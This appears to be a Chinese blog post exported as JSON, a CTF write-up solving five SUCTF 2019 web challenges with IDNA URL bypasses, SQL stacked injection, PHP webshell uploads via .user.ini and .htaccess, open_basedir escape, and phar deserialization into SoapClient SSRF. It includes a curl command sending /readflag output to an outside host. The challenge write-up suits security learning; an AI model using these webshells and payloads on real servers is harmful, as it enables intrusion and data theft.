$this->func3);\n        $reflectionMethod->invoke($this->instance, $this->arg3);\n    } //执行clazz中的func3方法，参数为arg3\n\n    function __destruct(){  //析构类调用的方法\n        system($this->cmd);\n    }\n}\n\nif($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){\n    if(isset($_POST['admin'])){\n        $cmd = $_POST['cmd'];\n\n        $clazz = $_POST['clazz'];\n        $func1 = $_POST['func1'];\n        $func2 = $_POST['func2'];\n        $func3 = $_POST['func3'];\n        $arg1 = $_POST['arg1'];\n        $arg2 = $_POST['arg2'];\n        $arg2 = $_POST['arg3'];\n        $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);\n        $admin->check();\n    }\n}\nelse {\n    echo \"You r not admin!\";\n}\n```\n\n[关于PHP反射类](https://www.jianshu.com/p/d02cbde1cdd7)\n\n大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。\n\n```php\n// func.php\n<?php\ninclude 'class.php';\nif (isset($_POST[\"submit\"]) && isset($_POST[\"url\"])) {\n    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i',$_POST['url'])){  \n        die(\"Go away!\");\n    }else{\n        $file_path = $_POST['url'];\n        $file = new File($file_path);\n        $file->getMIME();\n        echo \"<p>Your file type is '$file' </p>\";\n    }\n}\n?>\n```\n传入的url要经过正则匹配，调用file类\n```php\n// class.php\n<?php\ninclude 'config.php';\n\nclass File{\n\n    public $file_name;\n    public $type;\n    public $func = \"Check\";\n\n    function __construct($file_name){\n        $this->file_name = $file_name;\n    }\n\n    function __wakeup(){\n        $class = new ReflectionClass($this->func);\n        $a = $class->newInstanceArgs($this->file_name);\n        $a->check();\n    }\n    \n    function getMIME(){\n        $finfo = finfo_open(FILEINFO_MIME_TYPE);\n        $this->type = finfo_file($finfo, $this->file_name);\n        finfo_close($finfo);\n    }\n\n    function __toString(){\n        return $this->type;\n    }\n\n}\n\nclass Check{\n\n    public $file_name;\n\n    function __construct($file_name){\n        $this->file_name = $file_name;\n    }\n\n    function check(){\n        $data = file_get_contents($this->file_name);\n        if (mb_strpos($data, \"<?\") !== FALSE) {\n            die(\"&lt;? in contents!\");  //不能包含<?\n        }\n    }\n}\n```\n\n[关于MME类型文件](https://www.w3school.com.cn/media/media_mimeref.asp)   上传的文件要绕过Check::check()\n\nfinfo_file会触发phar的反序列化[参考文章1](https://paper.seebug.org/680/)     [参考文章2](https://xz.aliyun.com/t/2958)\n\n传入成功后url\n\nphar://开头被正则过滤，可以使用\n\n```\nphp://php://filter/resource=phar://\n```\n\n生成phar文件\n\n```php\n<?php\nclass File {\n    public $file_name = \"\";\n    public $func = \"SoapClient\";\n\n    function __construct(){\n        $target = \"http://127.0.0.1/admin.php\";\n        $post_string = 'admin=1&cmd=curl --referer \"`/readflag`\" --insecure \"http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK\"&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3='. \"\\r\\n\";\n        $headers = [];\n        $this->file_name  = [\n            null,\n            array('location' => $target,\n                'user_agent'=> str_replace('^^', \"\\r\\n\", 'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string),\n                'uri'=>'hello')\n        ];\n    }\n}\n$obj = new File();\n$phar = new Phar('poc.phar');\n$phar->startBuffering();\n$phar->setStub(\"GIF89a __HALT_COMPILER();\");\n$phar->setMetadata($obj);\n$phar->addFromString('1.txt','text');\n$phar->stopBuffering();\n?>\n```\n\n将生成的poc.phar改一个图片文件后缀，然后上传\n\n再func.php里面提交url\n\n```\nphp://filter/resource=phar://upload/2c67ca1eaeadbdc1868d67003072b481/551ccbaef945b2c4f3ca88361f08d600.jpg\n```\n\n关于构造SoapClient当中的cmd命令为\n\n```\ncurl --referer \"`/readflag`\" --insecure \"http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK\"\n```\n\n因为没有回显，只能使用将flag外带的方式带出来，使用buuoj的xss平台。id后面的字符是你创建的工程的数值\n\n\n\n附上出题人[出题笔记](https://xz.aliyun.com/t/6057)","source":"_posts/buuoj刷题记录11-SUCTF2019web复现.md","raw":"---\ntitle: buuoj刷题记录11-SUCTF2019web复现\ndate: 2020-02-04 23:46:53\ntags:\n - buuctf\n - web\n - suctf2019\ncategories: \n - 刷题记录\n---\n\n## Pythonginx\n\n- 2019 usa black hat一个议题  [会议pdf](https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf)\n\n  ![](/pic/67)\n\n- 关于[idna编码](https://datatracker.ietf.org/doc/rfc5891/)   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u\n\n- CVE-2019-9636  : urlsplit不处理NFKC标准化   \n\n<!--more-->\n\n题目给了源码\n\n```python\n@app.route('/getUrl', methods=['GET', 'POST'])\ndef getUrl():\n    url = request.args.get(\"url\")\n    host = parse.urlparse(url).hostname   #返回netloc部分\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 111\"\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == 'suctf.cc':\n        return \"我扌 your problem? 222 \" + host\n    newhost = []\n    for h in host.split('.'):\n        newhost.append(h.encode('idna').decode('utf-8'))\n    parts[1] = '.'.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(' ')[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == 'suctf.cc':\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return \"我扌 your problem? 333\"\n```\n\n*parse.urlparse()函数：将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：`scheme://netloc/path;parameters?query#fragment`*\n\n大致意思就是第一二次判断时netloc不是 suctf.cc，第三次要是suctf.cc,就返回url的网页源码\n\n题目标题是pythonginx，提示nginx，nginx文件路径如下\n\n```\n配置文件存放目录：/etc/nginx\n主配置文件：/etc/nginx/nginx.conf\n管理脚本：/usr/lib64/systemd/system/nginx.service\n模块：/usr/lisb64/nginx/modules\n应用程序：/usr/sbin/nginx\n程序默认存放位置：/usr/share/nginx/html\n日志默认存放位置：/var/log/nginx\n网站配置文件：/usr/local/nginx/conf/nginx.conf\n```\n\n\n\n**非预期解**\n\n以下是urlsplit函数源码\n\n```python\ndef urlunsplit(components):\n    scheme, netloc, url, query, fragment, _coerce_result = (\n                                          _coerce_args(*components))\n    if netloc or (scheme and scheme in uses_netloc and url[:2] != '//'):\n        if url and url[:1] != '/': url = '/' + url\n        url = '//' + (netloc or '') + url\n    if scheme:\n        url = scheme + ':' + url\n    if query:\n        url = url + '?' + query\n    if fragment:\n        url = url + '#' + fragment\n    return _coerce_result(url)\n```\n\n这个函数的作用就是如果截取的URL（也就是path的位置）包含//就不再处理path。\n\n也就是`scheme:////netloc/path;parameters?query#fragment`经过urlsplite处理后会变成\n\n```\nscheme='scheme', netloc='', path='//netloc/path;parameters', query='query', fragment='fragment'\n```\n\n再经过urlunsplit处理后会变成\n\n```\nscheme://netloc/path;parameters?query#fragment\n```\n\n如果传入的url是\n\n```\nfile:////suctf.cc/etc/passwd\n```\n\n会返回主机的用户记录\n\n```bash\nroot:*:17647:0:99999:7:::\ndaemon:*:17647:0:99999:7:::\nbin:*:17647:0:99999:7:::\nsys:*:17647:0:99999:7:::\nsync:*:17647:0:99999:7:::\ngames:*:17647:0:99999:7:::\nman:*:17647:0:99999:7:::\nlp:*:17647:0:99999:7:::\nmail:*:17647:0:99999:7:::\nnews:*:17647:0:99999:7:::\nuucp:*:17647:0:99999:7:::\nproxy:*:17647:0:99999:7:::\nwww-data:*:17647:0:99999:7:::\nbackup:*:17647:0:99999:7:::\nlist:*:17647:0:99999:7:::\nirc:*:17647:0:99999:7:::\ngnats:*:17647:0:99999:7:::\nnobody:*:17647:0:99999:7:::\n_apt:*:17647:0:99999:7:::\nnginx:!:17708:0:99999:7:::\n```\n\n查看配置文件\n\n```\ngetUrl?url=file:////suctf.cc/etc/nginx/nginx.conf\n```\n\n![](/pic/66)\n\n查看网站配置文件\n\n```\ngetUrl?url=file:////suctf.cc/usr/local/nginx/conf/nginx.conf\n```\n\n```\nserver {\n    listen 80;\n    location / {\n        try_files $uri @app;\n    }\n    location @app {\n        include uwsgi_params;\n        uwsgi_pass unix:///tmp/uwsgi.sock;\n    }\n    location /static {\n        alias /app/static;\n    }\n    # location /flag {\n    #     alias /usr/fffffflag;\n    # }\n}\n```\n\n提示flag再 /usr/fffffflag 中\n\n```\ngetUrl?url=file:////suctf.cc/usr/fffffflag\n```\n\n```\nflag{b692ca82-8292-4582-846a-286b3743f697}\n```\n\n\n\n**预期解**\nblack hat 上的所展示的部分字符\n![](/pic/69.png)\n\nAltman师傅写的脚本\n\n```\n# coding:utf-8 \nfor i in range(128,65537):    \n    tmp=chr(i)    \n    try:        \n        res = tmp.encode('idna').decode('utf-8')        \n        if(\"-\") in res:            \n            continue        \n        print(\"U:{}    A:{}      ascii:{} \".format(tmp, res, i))    \n    except:        \n        pass\n```\n\n\n可以使用**U+2102，ℂ**代替c，或者**U+2106, ℆**代替c/u\n\n\n读取网站配置文件\n\n```\ngetUrl?url=file:////suctf.ℂℂ/usr/local/nginx/conf/nginx.conf\n或者\ngetUrl?url=file:////suctf.c℆usr/local/nginx/conf/nginx.conf\n```\n\n读取flag\n\n```\n/getUrl?url=file://suctf.cℂ/usr/fffffflag\n或者\ngetUrl?url=file:////suctf.c℆usr/fffffflag\n```\n\n\n\n## EasySQL\n\n拿到题目是一个输入框，post类型提交\n\n先fuzz一遍，以下关键字被过滤\n\n![](/pic/68.png)\n\n**非预期解**\n\n```\n*,1\n```\n\n```\nArray ( [0] => flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} [1] => 1 )\n```\n\n\n\n**预期解**\n\n根据测试发现输入长度最大为40个字符\n\n还发现存在堆叠注入\n\n```\n1;show databases;#\n \nArray ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )\n```\n\n经过测试查询语句应该类似于\n\n```\nselect $_POST['query'] || flag ...\n```\n\n关于[sql_mod](https://mariadb.com/kb/en/sql-mode/)\n\n当设置sql_mode=**PIPES_AS_CONCAT**时，将\"||\"视为字符串的连接操作符而非或运算符，这和 Oracle 数据库是一样的，也和字符串的拼接函数 Concat 相类似\n\n所以payload为：\n\n```\n1;set sql_mode=PIPES_AS_CONCAT;select 1\n```\n\n返结果为：\n\n```\nArray ( [0] => 1 ) Array ( [0] => 1flag{36c7b843-6efb-409d-a1fe-3ef54fce7d6d} )\n```\n\n\n\n## CheckIn\n\n先直接上传图片马，提示文件内容包含`<?`，采用js的写法绕过\n\n```js\n<script language=\"php\"> \neval($_POST[cmd]);\n</script>\n```\n\n改后缀为PHP、PHP2、PHP3、PHP4、PHP5、Phtml，发现都被过滤\n\nphp有一个文件是[.user.ini](https://www.php.net/manual/zh/configuration.file.per-user.php)    [参考连接]([https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html](https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html))\n\n![](/pic/70)\n\n先上传一个图片马\n\n```http\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"1.gif\"\nContent-Type: image/gif\n\nGIF89a\n<script language=\"php\"> \neval($_POST[cmd]);\n</script>\n```\n\n上传.htaccess发现没有生效，然后上传.user.ini\n\n```\nContent-Disposition: form-data; name=\"fileUpload\"; filename=\"1.gif\"\nContent-Type: image/gif\n\nGIF89a\nauto_prepend_file=1.gif\n```\n\nauto_prepend_file=1.gif  相当于文件夹下所有文件都包含1.gif\n\n返回信息\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\">\n    <title>Upload Labs</title>\n</head>\n\n<body>\n    <h2>Upload Labs</h2>\n    <form action=\"index.php\" method=\"post\" enctype=\"multipart/form-data\">\n        <label for=\"file\">文件名：</label>\n        <input type=\"file\" name=\"fileUpload\" id=\"file\"><br>\n        <input type=\"submit\" name=\"upload\" value=\"提交\">\n    </form>\n</body>\n\n</html>\n\nYour dir uploads/2c67ca1eaeadbdc1868d67003072b481 <br>Your files : <br>array(5) {\n  [0]=>\n  string(1) \".\"\n  [1]=>\n  string(2) \"..\"\n  [2]=>\n  string(9) \".user.ini\"\n  [3]=>\n  string(5) \"1.gif\"\n  [4]=>\n  string(9) \"index.php\"\n}\n```\n\n使用蚁剑连接`host/uploads/2c67ca1eaeadbdc1868d67003072b481/index.php`即可\n\n![](/pic/71.png)\n\n\n\n## EasyWeb\n\n打开题目就是源码\n\n```php\n<?php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n\n$hhh = @$_GET['_'];\n\nif (!$hhh){\n    highlight_file(__FILE__);\n}\n\nif(strlen($hhh)>18){\n    die('One inch long, one inch strong!');\n}\n\nif ( preg_match('/[\\x00- 0-9A-Za-z\\'\"\\`~_&.,|=[\\x7F]+/i', $hhh) )\n    die('Try something else!');\n\n$character_type = count_chars($hhh, 3);\nif(strlen($character_type)>12) die(\"Almost there!\");\n\neval($hhh);\n?>\n```\n\n首先要绕过长度，然后是绕过正则。\n\n绕过长度可以新建一个变量，可以使用异或或者非运算绕过。（~操作要比异或简单，但是被禁用，可以使用异或运算模拟非运算）\n\n异或构造$_GET['\\_']\n\n```\necho urlencode(urldecode(\"%ff%ff%ff%ff\")^\"_GET\"); //%A0%B8%BA%AB\n```\n\npayload：\n\n```\n?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=phpinfo\n```\n\n查看phpinfo禁用了如下函数\n\n```\npcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail\n```\n\n还设置了`open_basedir`\n\n```\nopen_basedir\t/var/www/html/:/tmp/\n```\n\n\n\n```php\nfunction get_the_flag(){\n    // webadmin will remove your upload file every 20 min!!!! \n    $userdir = \"upload/tmp_\".md5($_SERVER['REMOTE_ADDR']);\n    if(!file_exists($userdir)){\n    mkdir($userdir);\n    }\n    if(!empty($_FILES[\"file\"])){\n        $tmp_name = $_FILES[\"file\"][\"tmp_name\"];\n        $name = $_FILES[\"file\"][\"name\"];\n        $extension = substr($name, strrpos($name,\".\")+1);\n    if(preg_match(\"/ph/i\",$extension)) die(\"^_^\"); \n        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die(\"^_^\");\n    if(!exif_imagetype($tmp_name)) die(\"^_^\"); \n        $path= $userdir.\"/\".$name;\n        @move_uploaded_file($tmp_name, $path);\n        print_r($path);\n    }\n}\n```\n\nstrrpos(要被检查的字符串,要搜索的字符串) :返回文件最后出现的位置\n\nmb_strpos(要被检查的字符串,要搜索的字符串)：返回要查找的字符串在别一个字符串中首次出现的位置\n\n此函数大致意思是文件内容不能包含<?，上传的文件要经过exif_imagetype（）检测\n\n\n\n使用payload上传文件\n\n```\n?_=${%FF%FF%FF%FF^%A0%B8%BA%AB}{%ff}();&%ff=get_the_flag\n```\n\n.htaccess\n\n```\n#define height 12\n#define width 12\nAddType application/x-httpd-php .cc\nphp_value auto_append_file \"php://filter/convert.base64-decode/resource=1.cc\"\n```\n\n1.cc\n\n```\nGIF89a00PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==\n```\n\nGIF89a与后面加密过的一句话不能使用空格或者回车隔开,因为base64解密文件时会出错，00可以修改为base64中允许出现的任意两个字符，此服务器版本为7.0+无法使用JS写法绕过<?\n\n\n\n[绕过open_basedir参考文章](https://www.cnblogs.com/cimuhuashuimu/p/11544487.html)\n\n绕过payload\n\n```\nchdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');echo(file_get_contents('flag'));`\n```\n\n\n\n先扫描目录\n\n```\n/upload/tmp_2c67ca1eaeadbdc1868d67003072b481/1.cc\n```\n\npost内容\n\n```\ncmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));\n```\n\n返回内容\n\n![](/pic/72.png)\n\n找到flag，读取flag\n\n```\ncmd=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file('/THis_Is_tHe_F14g'));\n```\n\n![](/pic/73.png)\n\n\n\n## Upload Labs 2\n\n给出了源码\n\n```php\n//admin.php\n<?php\ninclude 'config.php';\n\nclass Ad{\n\n    public $cmd;\n\n    public $clazz;\n    public $func1;\n    public $func2;\n    public $func3;\n    public $instance;\n    public $arg1;\n    public $arg2;\n    public $arg3;\n\n    function __construct($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3){  //构造类时调用的方法\n\n        $this->cmd = $cmd;\n\n        $this->clazz = $clazz;\n        $this->func1 = $func1;\n        $this->func2 = $func2;\n        $this->func3 = $func3;\n        $this->arg1 = $arg1;\n        $this->arg2 = $arg2;\n        $this->arg3 = $arg3;\n    }\n\n    function check(){\n\n        $reflect = new ReflectionClass($this->clazz);\n        $this->instance = $reflect->newInstanceArgs();  //实例化clazz类\n\n        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func1);\n        $reflectionMethod->invoke($this->instance, $this->arg1); //执行clazz中的func1方法，参数为arg1\n\n        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func2);\n        $reflectionMethod->invoke($this->instance, $this->arg2);//执行clazz中的func2方法，参数为arg2\n\n        $reflectionMethod = new ReflectionMethod($this->clazz, $this->func3);\n        $reflectionMethod->invoke($this->instance, $this->arg3);\n    } //执行clazz中的func3方法，参数为arg3\n\n    function __destruct(){  //析构类调用的方法\n        system($this->cmd);\n    }\n}\n\nif($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){\n    if(isset($_POST['admin'])){\n        $cmd = $_POST['cmd'];\n\n        $clazz = $_POST['clazz'];\n        $func1 = $_POST['func1'];\n        $func2 = $_POST['func2'];\n        $func3 = $_POST['func3'];\n        $arg1 = $_POST['arg1'];\n        $arg2 = $_POST['arg2'];\n        $arg2 = $_POST['arg3'];\n        $admin = new Ad($cmd, $clazz, $func1, $func2, $func3, $arg1, $arg2, $arg3);\n        $admin->check();\n    }\n}\nelse {\n    echo \"You r not admin!\";\n}\n```\n\n[关于PHP反射类](https://www.jianshu.com/p/d02cbde1cdd7)\n\n大致意思就是要构造ssrf进行命令执行。SoapClient可以构造http请求。\n\n```php\n// func.php\n<?php\ninclude 'class.php';\nif (isset($_POST[\"submit\"]) && isset($_POST[\"url\"])) {\n    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\\\s)*|(.|\\\\s)*(file|data|\\.\\.)(.|\\\\s)*/i',$_POST['url'])){  \n        die(\"Go away!\");\n    }else{\n        $file_path = $_POST['url'];\n        $file = new File($file_path);\n        $file->getMIME();\n        echo \"<p>Your file type is '$file' </p>\";\n    }\n}\n?>\n```\n传入的url要经过正则匹配，调用file类\n```php\n// class.php\n<?php\ninclude 'config.php';\n\nclass File{\n\n    public $file_name;\n    public $type;\n    public $func = \"Check\";\n\n    function __construct($file_name){\n        $this->file_name = $file_name;\n    }\n\n    function __wakeup(){\n        $class = new ReflectionClass($this->func);\n        $a = $class->newInstanceArgs($this->file_name);\n        $a->check();\n    }\n    \n    function getMIME(){\n        $finfo = finfo_open(FILEINFO_MIME_TYPE);\n        $this->type = finfo_file($finfo, $this->file_name);\n        finfo_close($finfo);\n    }\n\n    function __toString(){\n        return $this->type;\n    }\n\n}\n\nclass Check{\n\n    public $file_name;\n\n    function __construct($file_name){\n        $this->file_name = $file_name;\n    }\n\n    function check(){\n        $data = file_get_contents($this->file_name);\n        if (mb_strpos($data, \"<?\") !== FALSE) {\n            die(\"&lt;? in contents!\");  //不能包含<?\n        }\n    }\n}\n```\n\n[关于MME类型文件](https://www.w3school.com.cn/media/media_mimeref.asp)   上传的文件要绕过Check::check()\n\nfinfo_file会触发phar的反序列化[参考文章1](https://paper.seebug.org/680/)     [参考文章2](https://xz.aliyun.com/t/2958)\n\n传入成功后url\n\nphar://开头被正则过滤，可以使用\n\n```\nphp://php://filter/resource=phar://\n```\n\n生成phar文件\n\n```php\n<?php\nclass File {\n    public $file_name = \"\";\n    public $func = \"SoapClient\";\n\n    function __construct(){\n        $target = \"http://127.0.0.1/admin.php\";\n        $post_string = 'admin=1&cmd=curl --referer \"`/readflag`\" --insecure \"http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK\"&clazz=SplStack&func1=push&func2=push&func3=push&arg1=123456&arg2=123456&arg3='. \"\\r\\n\";\n        $headers = [];\n        $this->file_name  = [\n            null,\n            array('location' => $target,\n                'user_agent'=> str_replace('^^', \"\\r\\n\", 'xxxxx^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string),\n                'uri'=>'hello')\n        ];\n    }\n}\n$obj = new File();\n$phar = new Phar('poc.phar');\n$phar->startBuffering();\n$phar->setStub(\"GIF89a __HALT_COMPILER();\");\n$phar->setMetadata($obj);\n$phar->addFromString('1.txt','text');\n$phar->stopBuffering();\n?>\n```\n\n将生成的poc.phar改一个图片文件后缀，然后上传\n\n再func.php里面提交url\n\n```\nphp://filter/resource=phar://upload/2c67ca1eaeadbdc1868d67003072b481/551ccbaef945b2c4f3ca88361f08d600.jpg\n```\n\n关于构造SoapClient当中的cmd命令为\n\n```\ncurl --referer \"`/readflag`\" --insecure \"http://xss.buuoj.cn/index.php?do=api%26id=dzWPkK\"\n```\n\n因为没有回显，只能使用将flag外带的方式带出来，使用buuoj的xss平台。id后面的字符是你创建的工程的数值\n\n\n\n附上出题人[出题笔记](https://xz.aliyun.com/t/6057)","slug":"buuoj刷题记录11-SUCTF2019web复现","published":1,"updated":"2020-02-04T15:46:53.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfjd0005pk7e4mdb4ig2","content":"<h2 id=\"Pythonginx\"><a href=\"#Pythonginx\" class=\"headerlink\" title=\"Pythonginx\"></a>Pythonginx</h2><ul>\n<li><p>2019 usa black hat一个议题  <a href=\"https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf\" target=\"_blank\" rel=\"noopener\">会议pdf</a></p>\n<p><img src=\"/pic/67\" alt=\"\"></p>\n</li>\n<li><p>关于<a href=\"https://datatracker.ietf.org/doc/rfc5891/\" target=\"_blank\" rel=\"noopener\">idna编码</a>   在处理℆时，经过idna编码，再经过utf-8解码就会变成c/u</p>\n</li>\n<li><p>CVE-2019-9636  : urlsplit不处理NFKC标准化   </p>\n</li>\n</ul>\n<a id=\"more\"></a>\n\n<p>题目给了源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getUrl</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    url = request.args.get(<span class=\"string\">\"url\"</span>)</span><br><span class=\"line\">    host = parse.urlparse(url).hostname   <span class=\"comment\">#返回netloc部分</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 111\"</span></span><br><span class=\"line\">    parts = list(urlsplit(url))</span><br><span class=\"line\">    host = parts[<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 222 \"</span> + host</span><br><span class=\"line\">    newhost = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> host.split(<span class=\"string\">'.'</span>):</span><br><span class=\"line\">        newhost.append(h.encode(<span class=\"string\">'idna'</span>).decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    parts[<span class=\"number\">1</span>] = <span class=\"string\">'.'</span>.join(newhost)</span><br><span class=\"line\">    <span class=\"comment\">#去掉 url 中的空格</span></span><br><span class=\"line\">    finalUrl = urlunsplit(parts).split(<span class=\"string\">' '</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    host = parse.urlparse(finalUrl).hostname</span><br><span class=\"line\">    <span class=\"keyword\">if</span> host == <span class=\"string\">'suctf.cc'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">\"我扌 your problem? 333\"</span></span><br></pre></td></tr></table></figure>\n\n<p><em>parse.urlparse()函数：将URL解析为六个组件，返回一个6个元素的元组，对应URL的一般结构：<code>scheme://netloc/path;parameters?query#fragment</code></em></p>\n<p>大致意思就是第一二次判断时netloc不是 suctf.cc，第三次要是suctf.cc,就返回url的网页源码</p>\n<p>题目标题是pythonginx，提示nginx，nginx文件路径如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置文件存放目录：&#x2F;etc&#x2F;nginx</span><br><span class=\"line\">主配置文件：&#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class=\"line\">管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service</span><br><span class=\"line\">模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules</span><br><span class=\"line\">应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx</span><br><span class=\"line\">程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html</span><br><span class=\"line\">日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx</span><br><span class=\"line\">网站配置文件：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>非预期解</strong></p>\n<p>以下是urlsplit函数源码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">urlunsplit</span><span class=\"params\">(components)</span>:</span></span><br><span class=\"line\">    scheme, netloc, url, query, fragment, _coerce_result = (</span><br><span class=\"line\">                                          _coerce_args(*components))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> netloc <span class=\"keyword\">or</span> (scheme <span class=\"keyword\">and</span> scheme <span class=\"keyword\">in</span> uses_netloc <span class=\"keyword\">and</span> url[:<span class=\"number\">2</span>] != <span class=\"string\">'//'</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> url <span 